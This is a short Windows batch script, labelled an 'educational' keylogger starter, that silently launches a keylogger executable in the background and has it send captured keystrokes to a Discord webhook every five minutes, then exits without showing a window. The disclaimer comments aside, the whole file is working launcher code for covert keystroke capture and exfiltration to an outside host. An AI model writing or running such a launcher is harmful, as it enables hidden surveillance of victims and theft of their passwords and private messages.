@echo off
REM Educational Keylogger Starter
REM This script is for EDUCATIONAL PURPOSES ONLY

REM Replace the URL below with your actual Discord webhook URL
set DISCORD_WEBHOOK=https://discord.com/api/webhooks/your_webhook_id/your_webhook_token

REM Start the keylogger in silent mode with the Discord webhook
start /B "" "C:\keys\build\Keylogger.exe" --silent --discord "%DISCORD_WEBHOOK%" --interval 300

REM Exit without showing any window
exit 